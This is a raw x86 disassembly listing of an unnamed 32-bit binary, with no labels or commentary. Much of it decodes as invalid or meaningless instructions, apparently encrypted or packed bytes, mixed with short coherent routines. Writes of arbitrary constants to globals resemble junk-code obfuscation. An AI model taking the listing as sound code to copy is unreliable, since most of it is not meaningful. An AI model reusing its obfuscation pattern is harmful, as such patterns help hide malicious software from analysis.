  4048b7:	inc    ecx
  4048b8:	push   eax
  4048b9:	and    DWORD PTR [ebx+0x31],ebx
  4048bc:	jmp    0x690ba307
  4048c1:	and    ch,BYTE PTR [ecx+0x1c06d2ae]
  4048c7:	and    DWORD PTR [edx-0x3b3f4196],edi
  4048cd:	dec    ebx
  4048ce:	mov    WORD PTR [edi+ebp*8+0x9d2c4d1],ss
  4048d5:	test   eax,0xb43073d7
  4048da:	jne    0x4048af
  4048dc:	inc    esp
  4048dd:	lahf   
  4048de:	cmp    al,0xbb
  4048e0:	xchg   ecx,eax
  4048e1:	xchg   BYTE PTR [eax-0x249ac10],al
  4048e7:	in     eax,0x31
  4048e9:	jp     0x40488b
  4048eb:	ret    
  4048ec:	mov    dh,0x3d
  4048ee:	shl    BYTE PTR [eax+ecx*8+0x263a503e],1
  4048f5:	and    BYTE PTR [edx+ebp*4+0x7ff876c6],0x41
  4048fd:	push   0xfffffffb
  4048ff:	pushf  
  404900:	push   ecx
  404901:	data16 outs dx,BYTE PTR ds:[esi]
  404903:	outs   dx,BYTE PTR ds:[esi]
  404904:	mov    ch,0x94
  404906:	sub    al,0x6f
  404908:	lock je 0x40488f
  40490b:	fs popf 
  40490d:	pop    ebx
  40490e:	or     edi,edi
  404910:	int    0xf0
  404912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404913:	add    ebp,DWORD PTR [ebx+0x7e]
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e21c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e224,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e7ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e234,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fe05,0x42e234
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fe7a,0x42fdf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fe7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e803,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe82,0x42fe7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e807,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	lods   eax,DWORD PTR ds:[esi]
  4049bc:	repz dec ebp
  4049be:	and    ecx,ecx
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x9070707d
  4049c8:	xor    BYTE PTR [edi],0x9e
  4049cb:	and    BYTE PTR [ecx],dl
  4049cd:	(bad)  
  4049ce:	dec    edi
  4049cf:	push   0xfffffff0
  4049d1:	inc    esi
  4049d2:	add    ebx,edx
  4049d4:	dec    edi
  4049d5:	mov    edx,DWORD PTR [ebx+0x5e]
  4049d8:	jge    0x4049ed
  4049da:	dec    ecx
  4049db:	push   edx
  4049dc:	push   esi
  4049dd:	addr16 push esi
  4049df:	mov    ebp,0x3db09f4c
  4049e4:	icebp  
  4049e5:	popf   
  4049e6:	scas   al,BYTE PTR es:[edi]
  4049e7:	out    0x2a,eax
  4049e9:	(bad)  
  4049ea:	hlt    
  4049eb:	and    bh,dh
  4049ed:	jl     0x4049f7
  4049ef:	test   BYTE PTR [edi+0x33],al
  4049f2:	sbb    DWORD PTR [edx],0xf31579d3
  4049f8:	push   ss
  4049f9:	or     DWORD PTR [ecx+0x12],esi
  4049fc:	mov    ch,0x82
  4049fe:	lahf   
  4049ff:	mov    esp,?
  404a01:	jae    0x4049a0
  404a03:	pop    ecx
  404a04:	popf   
  404a05:	ins    DWORD PTR es:[edi],dx
  404a06:	push   ecx
  404a07:	arpl   WORD PTR [edi],bx
  404a09:	jmp    FWORD PTR [eax-0x4f960f00]
  404a0f:	xchg   ebx,eax
  404a10:	stos   BYTE PTR es:[edi],al
  404a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a12:	mov    ebp,0x8b325b6f
  404a17:	(bad)  
  404a18:	cmp    eax,0xa7751da5
  404a1d:	mov    eax,0x36ae30
  404a22:	stos   BYTE PTR es:[edi],al
  404a23:	retf   
  404a24:	pop    ss
  404a25:	out    0x3d,eax
  404a27:	sbb    DWORD PTR [ebp+0x4ec254c2],esp
  404a2d:	nop
  404a2e:	fnstsw WORD PTR [eax+0x2f37f20f]
  404a34:	and    edx,edx
  404a36:	leave  
  404a37:	ret    0x162b
  404a3a:	dec    DWORD PTR [ebx-0x7a56b893]
  404a40:	ins    DWORD PTR es:[edi],dx
  404a41:	outs   dx,DWORD PTR ds:[esi]
  404a42:	sub    eax,0x4019b7be
  404a47:	mov    dl,0xda
  404a49:	sbb    dl,dl
  404a4b:	push   ds
  404a4c:	add    DWORD PTR [ecx],esp
  404a4e:	or     DWORD PTR [edi],edi
  404a50:	sub    DWORD PTR [edx-0x5b],eax
  404a53:	xor    BYTE PTR [eax+eax*1-0xa],dl
  404a57:	in     eax,dx
  404a58:	imul   esp,DWORD PTR [ebx-0x688430fa],0xf659f5cd
  404a62:	test   BYTE PTR [eax*1-0x2782eedf],cl
  404a69:	imul   esp,DWORD PTR [esi-0x111df5fa],0xffffff9c
  404a70:	xchg   ebx,eax
  404a71:	mov    BYTE PTR [eax-0x73],al
  404a74:	sti    
  404a75:	rcl    BYTE PTR [ebp+0x1c8f7409],cl
  404a7b:	push   esp
  404a7c:	add    bl,ah
  404a7e:	dec    edi
  404a7f:	mov    ds:0xf9746fa1,al
  404a84:	sub    eax,0x40826866
  404a89:	jg     0x404ab8
  404a8b:	in     al,dx
  404a8c:	or     edx,DWORD PTR [ecx]
  404a8e:	xchg   edi,eax
  404a8f:	clc    
  404a90:	add    eax,0xf8ecfb69
  404a95:	in     al,dx
  404a96:	fwait
  404a97:	inc    ebx
  404a98:	icebp  
  404a99:	sub    BYTE PTR [ebx+ebx*4-0x57],bh
  404a9d:	fsubr  DWORD PTR [edi+0x75f2787d]
  404aa3:	sub    eax,0xecbc012b
  404aa8:	xor    al,0xeb
  404aaa:	fmul   DWORD PTR [edi-0x2f]
  404aad:	loopne 0x404ae2
  404aaf:	jno    0x404a4c
  404ab1:	repnz test dl,bh
  404ab4:	pop    es
  404ab5:	adc    edx,eax
  404ab7:	pop    eax
  404ab8:	mov    ds:0xa00edda8,al
  404abd:	and    DWORD PTR [ecx+0x16],esp
  404ac0:	jbe    0x404a93
  404ac2:	adc    ah,BYTE PTR [eax+0x75]
  404ac5:	mov    bl,0x23
  404ac7:	or     eax,0x21de8281
  404acc:	push   ss
  404acd:	sub    al,0x96
  404acf:	sbb    BYTE PTR [esi],al
  404ad1:	fadd   DWORD PTR ds:0xee41f288
  404ad7:	mov    ds:0xf83da33d,al
  404adc:	popa   
  404add:	dec    esi
  404ade:	push   cs
  404adf:	imul   BYTE PTR [ebp-0x1273efa]
  404ae5:	arpl   WORD PTR [edx-0x10],di
  404ae8:	outs   dx,BYTE PTR ds:[esi]
  404ae9:	dec    esp
  404aea:	sub    ebx,DWORD PTR [eax]
  404aec:	mov    al,ds:0x3761ce3e
  404af1:	jmp    0x70b6e7e2
  404af6:	push   ds
  404af7:	retf   0x577
  404afa:	stc    
  404afb:	aaa    
  404afc:	push   0xffffff8e
  404afe:	mov    BYTE PTR [edi+esi*8],dl
  404b01:	fs ret 
  404b03:	or     BYTE PTR [ebp-0x2b],bl
  404b06:	mov    esi,0x5ca7fea7
  404b0b:	sbb    al,0xc
  404b0d:	sbb    bl,BYTE PTR [ebx+ebp*2]
  404b10:	push   ds
  404b11:	lahf   
  404b12:	inc    ecx
  404b13:	jnp    0x404ac7
  404b15:	adc    esp,0x14748225
  404b1b:	or     eax,0xefa9b867
  404b20:	jl     0x404ab1
  404b22:	adc    esp,DWORD PTR [eax]
  404b24:	fist   DWORD PTR [ebx+ebp*1+0x3deb4899]
  404b2b:	jge    0x404b8c
  404b2d:	mov    cl,0xe2
  404b2f:	xchg   esp,eax
  404b30:	xchg   edx,eax
  404b31:	sub    eax,0x777b6ce6
  404b36:	pop    edx
  404b37:	inc    ebp
  404b38:	mov    ebp,DWORD PTR [ebp-0x23fce5b2]
  404b3e:	mov    bh,0x75
  404b40:	das    
  404b41:	sbb    BYTE PTR [eax+0x55],0x79
  404b45:	loopne 0x404b2c
  404b47:	ror    dh,1
  404b49:	cmp    al,0x85
  404b4b:	pushf  
  404b4c:	sub    eax,0xae400d53
  404b51:	ds cdq 
  404b53:	jns    0x404b34
  404b55:	dec    esi
  404b56:	xchg   ebp,eax
  404b57:	in     al,0x6a
  404b59:	mov    cs,WORD PTR [esi-0x1a]
  404b5c:	sbb    al,0x80
  404b5e:	fstp   DWORD PTR [ecx+ecx*1-0x32637571]
  404b65:	les    esi,FWORD PTR [eax-0x6ce324e1]
  404b6b:	leave  
  404b6c:	shl    BYTE PTR [esi],cl
  404b6e:	mov    bl,0xdd
  404b70:	stos   DWORD PTR es:[edi],eax
  404b71:	and    esp,DWORD PTR [eax]
  404b73:	stc    
  404b74:	push   ebx
  404b75:	mov    edx,0xe2c68e1b
  404b7a:	test   BYTE PTR [ebp-0x74d8a808],al
  404b80:	sbb    ecx,esi
  404b82:	push   ds
  404b83:	ror    DWORD PTR [ebx+0x28],1
  404b86:	retf   
  404b87:	jae    0x404b24
  404b89:	test   eax,0x6bbf4bbd
  404b8e:	fisub  DWORD PTR [eax-0x3]
  404b91:	std    
  404b92:	hlt    
  404b93:	jecxz  0x404b66
  404b95:	hlt    
  404b96:	dec    ecx
  404b97:	adc    ah,ah
  404b99:	out    0x1b,eax
  404b9b:	(bad)  
  404b9c:	cmp    dh,BYTE PTR [ecx-0x4b]
  404b9f:	ins    DWORD PTR es:[edi],dx
  404ba0:	dec    eax
  404ba1:	sbb    cl,BYTE PTR [esi]
  404ba3:	cli    
  404ba4:	dec    eax
  404ba5:	mov    eax,0xa7346cbc
  404baa:	push   0x11
  404bac:	push   cs
  404bad:	lock sbb al,0xb3
  404bb0:	fidiv  WORD PTR [edx+0x73a963f3]
  404bb6:	ds mov ecx,0x37b25fd3
  404bbc:	sub    BYTE PTR [ebx+0x43c8d5c8],ch
  404bc2:	jl     0x404bda
  404bc4:	sub    BYTE PTR [edx-0x18442993],bh
  404bca:	xchg   BYTE PTR [esi+0x40],bl
  404bcd:	push   ds
  404bce:	pushf  
  404bcf:	cmc    
  404bd0:	xor    eax,0x2ecb7d87
  404bd5:	outs   dx,BYTE PTR ds:[esi]
  404bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd7:	pop    ds
  404bd8:	mul    BYTE PTR [esi]
  404bda:	out    0x63,al
  404bdc:	cs jo  0x404bc9
  404bdf:	inc    ebp
  404be0:	fmul   DWORD PTR [eax]
  404be2:	mov    ds:0x57a7cce6,eax
  404be7:	lods   eax,DWORD PTR ds:[esi]
  404be8:	in     al,0x73
  404bea:	cmc    
  404beb:	mov    eax,0x776327a2
  404bf0:	jge    0x404b8d
  404bf2:	into   
  404bf3:	in     eax,dx
  404bf4:	xor    BYTE PTR [edi+0x15fcfee4],bh
  404bfa:	cwde   
  404bfb:	xchg   ebp,eax
  404bfc:	shl    ah,1
  404bfe:	test   eax,0xd695bbf1
  404c03:	mov    ch,0xef
  404c05:	or     ebp,DWORD PTR [edi-0x47]
  404c08:	cmp    dh,BYTE PTR [ebx-0x5d]
  404c0b:	jp     0x404bf0
  404c0d:	mov    ch,BYTE PTR [edx+0x386d2450]
  404c13:	jae    0x404c90
  404c15:	repnz lock daa 
  404c18:	(bad)  [edi+0x5f007546]
  404c1e:	leave  
  404c1f:	sub    ch,ch
  404c21:	in     eax,dx
  404c22:	lods   eax,DWORD PTR ds:[esi]
  404c23:	pop    ecx
  404c24:	dec    eax
  404c25:	sbb    al,0x9c
  404c27:	sbb    BYTE PTR [edi+ecx*2],cl
  404c2a:	iret   
  404c2b:	rcl    DWORD PTR [ecx-0x57],1
  404c2e:	stos   BYTE PTR es:[edi],al
  404c2f:	add    BYTE PTR [edx+eiz*1+0x3e76271b],ch
  404c36:	add    DWORD PTR [edi],esi
  404c38:	jg     0x404c61
  404c3a:	xchg   edi,eax
  404c3b:	jno    0x404bf6
  404c3d:	stc    
  404c3e:	ja     0x404bd6
  404c40:	jl     0x404ca9
  404c42:	or     eax,0x6e0d5cbb
  404c47:	mov    WORD PTR [ebp-0x32],gs
  404c4a:	adc    ebx,DWORD PTR [esi+0x4]
  404c4d:	imul   ecx,DWORD PTR [eax-0x7c],0xffffffa3
  404c51:	add    bl,BYTE PTR [ecx+ebx*8]
  404c54:	mov    esi,0x110b6f6f
  404c59:	pop    ecx
  404c5a:	lods   eax,DWORD PTR ds:[esi]
  404c5b:	inc    ecx
  404c5c:	jae    0x404ca0
  404c5e:	hlt    
  404c5f:	jo     0x404c26
  404c61:	shr    DWORD PTR [edx-0x230bff72],cl
  404c67:	(bad)  
  404c69:	mov    esp,0x422e1e73
  404c6e:	pop    ebx
  404c6f:	test   BYTE PTR [esi+0x1d],ch
  404c72:	sbb    al,0x71
  404c74:	leave  
  404c75:	mov    ebp,0xb9ed2848
  404c7a:	enter  0x193,0xb2
  404c7e:	std    
  404c7f:	pop    esp
  404c80:	inc    ebx
  404c81:	out    dx,al
  404c82:	(bad)  
  404c83:	cli    
  404c84:	add    al,BYTE PTR [ecx-0x3cdcf559]
  404c8a:	call   0xcb586f52
  404c8f:	(bad)  
  404c90:	cmp    eax,0xfb294df3
  404c95:	or     eax,0xcd99385f
  404c9a:	loop   0x404cf1
  404c9c:	sbb    BYTE PTR [esi+0x9],ch
  404c9f:	push   ss
  404ca0:	or     ecx,DWORD PTR [ebx+eax*1-0xc]
  404ca4:	jnp    0x404c2e
  404ca6:	lds    esp,FWORD PTR [edx+0x6f]
  404ca9:	sub    ecx,edx
  404cab:	pop    eax
  404cac:	mov    al,0xd3
  404cae:	add    al,0x10
  404cb0:	sahf   
  404cb1:	pop    esp
  404cb2:	xchg   ebx,eax
  404cb3:	inc    edi
  404cb4:	and    ebx,edx
  404cb6:	repnz mov esp,0xedf594b0
  404cbc:	xchg   ebx,eax
  404cbd:	mov    eax,0x68287722
  404cc2:	fdiv   DWORD PTR [esi+0x2cf35cde]
  404cc8:	xor    DWORD PTR [ebp+ebx*4-0x4c],0xffffffea
  404ccd:	jne    0x404ce9
  404ccf:	ja     0x404d34
  404cd1:	arpl   WORD PTR [edx+0x304092dd],dx
  404cd7:	stos   BYTE PTR es:[edi],al
  404cd8:	jecxz  0x404cb0
  404cda:	fld    TBYTE PTR [ecx-0x4a11017f]
  404ce0:	lods   al,BYTE PTR ds:[esi]
  404ce1:	jnp    0x404d42
  404ce3:	test   dl,0x2a
  404ce6:	add    DWORD PTR [ecx],edi
  404ce8:	mov    ah,0x4f
  404cea:	loop   0x404d4d
  404cec:	int    0x9c
  404cee:	mov    al,0x7c
  404cf0:	mov    BYTE PTR [edi+esi*2-0x239f0818],dl
  404cf7:	ds ret 0xe13a
  404cfb:	imul   edi,DWORD PTR [ecx],0xd109a2d3
  404d01:	and    DWORD PTR [ebx+ebp*1-0x17437a80],ecx
  404d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d09:	std    
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e7ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e7eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x7f]
  404d39:	jns    0x404cd7
  404d3b:	pop    ss
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0xc570707d
  404d45:	mov    ebp,0xaa8037a6
  404d4a:	pop    ebp
  404d4b:	(bad)  
  404d4c:	mov    DWORD PTR ds:[ebp+ebp*2+0x549e9f28],edx
  404d54:	push   ebx
  404d55:	add    DWORD PTR [edi+0x16],eax
  404d58:	icebp  
  404d59:	sar    DWORD PTR [ecx+ebx*1-0x5b],0x59
  404d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d5f:	sar    BYTE PTR [ebx+0x3b],cl
  404d62:	push   eax
  404d63:	clc    
  404d64:	or     al,0x14
  404d66:	adc    BYTE PTR [edi+0xe],ch
  404d69:	out    0xc5,eax
  404d6b:	mov    eax,0xa18a0537
  404d70:	cs loop 0x404dcd
  404d73:	fild   WORD PTR [esi-0x4d22994b]
  404d79:	or     BYTE PTR [esi+0x2ceba139],0xf7
  404d80:	push   ebp
  404d81:	push   0xffffff86
  404d83:	mov    bh,0xb6
  404d85:	(bad)  
  404d86:	loopne 0x404d6b
  404d88:	(bad)  
  404d89:	repnz add DWORD PTR [edx-0x19],esp
  404d8d:	dec    ebp
  404d8e:	adc    eax,0xebb0b119
  404d93:	loope  0x404d49
  404d95:	stos   BYTE PTR es:[edi],al
  404d96:	and    DWORD PTR [edi],ebx
  404d98:	xor    cl,BYTE PTR [ecx+0x68c4f7a0]
  404d9e:	push   edi
  404d9f:	sbb    ebx,DWORD PTR ds:0xab34d666
  404da5:	push   edi
  404da6:	cwde   
  404da7:	jg     0x404d4b
  404da9:	sub    eax,0x1c9fb1ba
  404dae:	adc    DWORD PTR [edx+0x59],esp
  404db1:	xor    DWORD PTR [ebp-0x7c],edx
  404db4:	push   0x3ccf3921
  404db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dba:	add    eax,0x1a6ccca0
  404dbf:	test   al,0x18
  404dc1:	fcomp  DWORD PTR [ebx+0x6ed06eb6]
  404dc7:	pop    esp
  404dc8:	mov    DWORD PTR [edi-0x7db8b068],ebp
  404dce:	lea    ecx,[eax]
  404dd0:	jae    0x404e1c
  404dd2:	ret    0xda64
  404dd5:	popa   
  404dd6:	add    BYTE PTR [edx+0x57],bh
  404dd9:	mov    ebx,DWORD PTR [edx]
  404ddb:	rcr    bl,0x19
  404dde:	lods   al,BYTE PTR ds:[esi]
  404ddf:	mov    esp,0xc51874db
  404de4:	(bad)  
  404de5:	aad    0xa9
  404de7:	dec    edi
  404de8:	es (bad) 
  404dea:	cmp    esp,esp
  404dec:	push   ebp
  404ded:	cdq    
  404dee:	ja     0x404d7e
  404df0:	hlt    
  404df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404df2:	mov    ds:0xe3496ae,al
  404df7:	jo     0x404dab
  404df9:	mov    esp,0xea70f1fe
  404dfe:	outs   dx,DWORD PTR ds:[esi]
  404dff:	bound  edx,QWORD PTR [ebp+0x1799c79a]
  404e05:	xchg   edi,esp
  404e07:	es jnp 0x404deb
  404e0a:	lea    esp,[eax-0x9fe7389]
  404e10:	div    DWORD PTR [edx-0x661ba451]
  404e16:	test   al,0x49
  404e18:	jmp    0x404e67
  404e1a:	lods   eax,DWORD PTR ds:[esi]
  404e1b:	sub    al,0x4c
  404e1d:	sub    BYTE PTR [edx],cl
  404e1f:	nop
  404e20:	or     DWORD PTR [ecx-0x2446a12c],0x3e81eacc
  404e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e2b:	inc    esp
  404e2c:	ret    0x200e
  404e2f:	adc    BYTE PTR [ebx+0x4a6c4abf],dh
  404e35:	and    DWORD PTR [edx],edx
  404e37:	push   ss
  404e38:	fcom   QWORD PTR [esi-0x65]
  404e3b:	or     dh,BYTE PTR [ebx]
  404e3d:	mov    edi,0x36d71d36
  404e42:	sahf   
  404e43:	rcr    BYTE PTR [edi-0x20f7174b],cl
  404e49:	jnp    0x404de5
  404e4b:	popf   
  404e4c:	cdq    
  404e4d:	xchg   ebx,eax
  404e4e:	push   cs
  404e4f:	out    0xac,al
  404e51:	(bad)
  404e55:	jbe    0x404e9e
  404e57:	mov    esi,0x9b6d120b
  404e5c:	jo     0x404ea2
  404e5e:	mov    ah,0x76
  404e60:	aas    
  404e61:	jns    0x404e2d
  404e63:	inc    edi
  404e64:	xchg   esi,eax
  404e65:	leave  
  404e66:	sub    DWORD PTR [ebx+0xa74f86e],esi
  404e6c:	pop    ecx
  404e6d:	aaa    
  404e6e:	mov    dl,0x63
  404e70:	push   ds
  404e71:	test   eax,0x3f8f63c7
  404e76:	sbb    ch,BYTE PTR [edi+0x7782ede2]
  404e7c:	daa    
  404e7d:	mov    dl,0x6b
  404e7f:	mov    al,ds:0x19e0775
  404e84:	sbb    eax,0xb5dcc8ac
  404e89:	sbb    BYTE PTR [ebx+0x4315f364],al
  404e8f:	push   esi
  404e90:	xor    eax,0xcd07a676
  404e95:	popf   
  404e96:	popf   
  404e97:	fst    DWORD PTR [eax-0x70]
  404e9a:	adc    esp,DWORD PTR [esi+eiz*8]
  404e9d:	mov    eax,ds:0x95286643
  404ea2:	push   ebp
  404ea3:	inc    ebx
  404ea4:	retf   0xd88e
  404ea7:	mov    ebp,0x42859047
  404eac:	pop    ecx
  404ead:	sbb    dh,dl
  404eaf:	inc    edx
  404eb0:	retf   
  404eb1:	push   cs
  404eb2:	or     DWORD PTR [eax+0x49ffa7fd],ebp
  404eb8:	(bad)  [eax]
  404eba:	aad    0xb0
  404ebc:	popa   
  404ebd:	inc    ebp
  404ebe:	idiv   bh
  404ec0:	jge    0x404ea6
  404ec2:	(bad)  
  404ec3:	enter  0xa565,0x12
  404ec7:	pminub mm1,QWORD PTR [ecx+0x5c5b1391]
  404ece:	setb   bh
  404ed1:	shr    BYTE PTR [ecx-0x58],0x1f
  404ed5:	test   DWORD PTR [edi+0x42],ebp
  404ed8:	fs push eax
  404eda:	sub    esp,DWORD PTR [ebp-0x27]
  404edd:	mov    esi,0x9a24b99a
  404ee2:	or     al,0x9e
  404ee4:	adc    ebx,DWORD PTR [ebx+ebp*4+0x13042f5c]
  404eeb:	pop    esp
  404eec:	sub    DWORD PTR [eax+0x69],edi
  404eef:	dec    DWORD PTR [edi-0x4d]
  404ef2:	cmp    BYTE PTR [ebp-0x59],ah
  404ef5:	xchg   ebx,eax
  404ef6:	std    
  404ef7:	or     BYTE PTR [ebp-0x5b],ch
  404efa:	rcl    BYTE PTR [edi+0x71],0x4e
  404efe:	arpl   cx,sp
  404f00:	enter  0x5938,0x8f
  404f04:	ret    
  404f05:	call   FWORD PTR [edi]
  404f07:	not    dh
  404f09:	rcr    DWORD PTR [esp+ecx*2-0x67],1
  404f0d:	fnsave [edx-0x2853d31f]
  404f13:	jecxz  0x404eb5
  404f15:	adc    dh,bl
  404f17:	test   DWORD PTR [ebp+0x7b36438d],edx
  404f1d:	mov    ch,0x23
  404f1f:	test   al,0xd0
  404f21:	dec    edx
  404f22:	mov    esp,ss
  404f24:	cmp    DWORD PTR ds:0x4fd057dc,0x1c
  404f2b:	test   dl,ah
  404f2d:	add    eax,ecx
  404f2f:	addr16 xor cl,ch
  404f32:	call   0x59afe4d0
  404f37:	cld    
  404f38:	jmp    0x9741f747
  404f3d:	pushf  
  404f3e:	push   eax
  404f3f:	fldenv [edx+0x6efa0162]
  404f45:	mov    ebp,ds
  404f47:	pop    ebp
  404f48:	mov    bh,0xed
  404f4a:	jle    0x404f52
  404f4c:	das    
  404f4d:	rcr    DWORD PTR [eax],0x6c
  404f50:	(bad)  
  404f51:	push   ecx
  404f52:	data16 loopne 0x404fc1
  404f55:	arpl   WORD PTR [ebp+0x5d],bp
  404f58:	in     eax,dx
  404f59:	in     eax,0x5a
  404f5b:	xor    bl,BYTE PTR [eax+0x41309e82]
  404f61:	out    dx,eax
  404f62:	inc    ebx
  404f63:	dec    eax
  404f64:	das    
  404f65:	les    ecx,FWORD PTR [edx*4-0x1438f66c]
  404f6c:	jmp    0x404fad
  404f6e:	fcmovne st,st(4)
  404f70:	mov    ebp,0xc6dc5f12
  404f75:	jl     0x404f1a
  404f77:	iret   
  404f78:	and    dh,BYTE PTR [ecx-0x4f]
  404f7b:	mov    dl,0x14
  404f7d:	mov    WORD PTR [edi-0x22],ds
  404f80:	int    0xd4
  404f82:	mov    edx,0xf323a5f3
  404f87:	div    DWORD PTR fs:[eax+ebp*8+0x1d]
  404f8c:	mov    dh,dh
  404f8e:	in     al,0x24
  404f90:	mov    esp,DWORD PTR ds:0x81d841c4
  404f96:	and    eax,0x574b32a1
  404f9b:	push   es
  404f9c:	mov    ds:0x4a197842,al
  404fa1:	pop    eax
  404fa2:	jge    0x404f4b
  404fa4:	or     eax,0xe19276de
  404fa9:	call   0x16d6:0x9a509c20
  404fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fb1:	jno    0x404f3e
  404fb3:	inc    eax
  404fb4:	mov    eax,ds:0x3c5d9b54
  404fb9:	(bad)  [edx-0x25]
  404fbc:	mov    ds:0x6a93f00c,eax
  404fc1:	push   edi
  404fc2:	cs enter 0xe48e,0xb
  404fc7:	je     0x40503a
  404fc9:	xchg   DWORD PTR [edi+ebx*2],esp
  404fcc:	les    eax,FWORD PTR [ebx-0x3d3731c1]
  404fd2:	repz cdq 
  404fd4:	mov    edi,0xd7490d6a
  404fd9:	aad    0xfd
  404fdb:	(bad)  
  404fdc:	repz ret 0xf80a
  404fe0:	fisttp DWORD PTR [edx-0x382227f2]
  404fe6:	sbb    al,0x41
  404fe8:	sub    al,ah
  404fea:	aam    0xc9
  404fec:	out    0x14,eax
  404fee:	cmp    bh,BYTE PTR [edi-0x73]
  404ff1:	jne    0x40505e
  404ff3:	fcomi  st,st(6)
  404ff5:	inc    ecx
  404ff6:	mov    DWORD PTR [esi+0x12f5b936],esp
  404ffc:	pop    ecx
  404ffd:	rcl    BYTE PTR [ecx],cl
  404fff:	test   al,0xdf
  405001:	jbe    0x405017
  405003:	jb     0x404fe7
  405005:	jns    0x405079
  405007:	pop    ebp
  405008:	mov    WORD PTR [ecx],cs
  40500a:	xchg   DWORD PTR [edi-0x4608f875],edx
  405010:	inc    edx
  405011:	sbb    al,0x69
  405013:	cmp    ebx,esp
  405015:	repz popf 
  405017:	xchg   esp,eax
  405018:	dec    ebx
  405019:	clc    
  40501a:	adc    eax,0x98a32ec
  40501f:	test   DWORD PTR [ecx+0x36c157db],ebx
  405025:	mov    esi,DWORD PTR [ecx+0x7825f29a]
  40502b:	pop    ecx
  40502c:	div    DWORD PTR [ebx-0x5f]
  40502f:	push   0x18211e74
  405034:	fild   WORD PTR [esi-0x2619f2be]
  40503a:	retf   
  40503b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40503c:	test   al,0xc8
  40503e:	mov    al,ds:0x216552bd
  405043:	mov    cl,0x10
  405045:	popf   
  405046:	retw   0x6198
  40504a:	cdq    
  40504b:	loope  0x404fe4
  40504d:	sub    bl,0x46
  405050:	neg    edi
  405052:	mov    ds:0xb84f1b96,eax
  405057:	loop   0x404fdd
  405059:	(bad)  
  40505a:	test   al,0xed
  40505c:	imul   edi,DWORD PTR [eax-0x22a1fac8],0x2e
  405063:	push   ecx
  405064:	mov    edx,0x56c2d052
  405069:	retf   
  40506a:	xor    eax,0x91bfcd3
  40506f:	sar    DWORD PTR [edi+eax*4+0x6dd770d4],cl
  405076:	xchg   edx,eax
  405077:	pop    edx
  405078:	aad    0x70
  40507a:	sub    edi,0xd
  40507d:	adc    BYTE PTR [esi+0x5b],dl
  405080:	ror    BYTE PTR [edx+0x1a2e61c6],1
  405086:	adc    BYTE PTR [ebx+0x3b42f445],cl
  40508c:	ror    BYTE PTR [edi],1
  40508e:	test   DWORD PTR [edx+0x5ffffff8],ebp
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
